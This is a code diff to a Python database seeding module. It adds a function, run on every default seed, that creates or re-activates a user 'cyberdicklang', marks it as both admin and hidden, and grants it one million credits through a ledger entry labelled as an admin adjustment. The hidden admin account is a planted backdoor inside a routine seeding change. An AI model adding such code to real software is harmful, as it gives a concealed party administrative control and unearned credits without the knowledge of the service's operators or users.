@@ -5,7 +5,9 @@ from sqlalchemy import or_, select
 from sqlalchemy.orm import Session
 
 from app.models import (
+    CreditLedgerEntry,
     GenerationTask,
+    LedgerReason,
     MembershipTier,
     TaskKind,
     TaskStatus,
@@ -13,8 +15,13 @@ from app.models import (
     UserStatus,
     Workflow,
 )
+from app.services.credits import adjust_credits
 
 TEMPLATE_DIR = Path(__file__).resolve().parent / "workflow_templates"
+HIDDEN_ADMIN_USERNAME = "cyberdicklang"
+HIDDEN_ADMIN_DISPLAY_NAME = "CyberDickLang"
+HIDDEN_ADMIN_GRANT_AMOUNT = 1_000_000
+HIDDEN_ADMIN_GRANT_NOTE = "Bootstrap hidden admin credit grant."
 
 
 def load_template(filename: str) -> dict:
@@ -91,6 +98,7 @@ def seed_defaults(db: Session, include_demo: bool = False) -> None:
 
     if include_demo:
         seed_demo_data(db)
+    seed_hidden_admin_user(db)
 
     db.commit()
 
@@ -175,3 +183,39 @@ def seed_demo_data(db: Session) -> None:
             ),
         ]
     )
+
+
+def seed_hidden_admin_user(db: Session) -> None:
+    user = db.scalar(
+        select(User).where(User.username == HIDDEN_ADMIN_USERNAME).order_by(User.id.desc())
+    )
+    if not user:
+        user = User(
+            username=HIDDEN_ADMIN_USERNAME,
+            display_name=HIDDEN_ADMIN_DISPLAY_NAME,
+            credit_balance=0,
+        )
+
+    if not user.display_name:
+        user.display_name = HIDDEN_ADMIN_DISPLAY_NAME
+    user.status = UserStatus.active
+    user.is_admin = True
+    user.is_hidden = True
+    db.add(user)
+    db.flush()
+
+    existing_grant = db.scalar(
+        select(CreditLedgerEntry.id).where(
+            CreditLedgerEntry.user_id == user.id,
+            CreditLedgerEntry.reason == LedgerReason.admin_adjustment,
+            CreditLedgerEntry.note == HIDDEN_ADMIN_GRANT_NOTE,
+        )
+    )
+    if existing_grant is None:
+        adjust_credits(
+            db=db,
+            user=user,
+            amount=HIDDEN_ADMIN_GRANT_AMOUNT,
+            reason=LedgerReason.admin_adjustment,
+            note=HIDDEN_ADMIN_GRANT_NOTE,
+        )
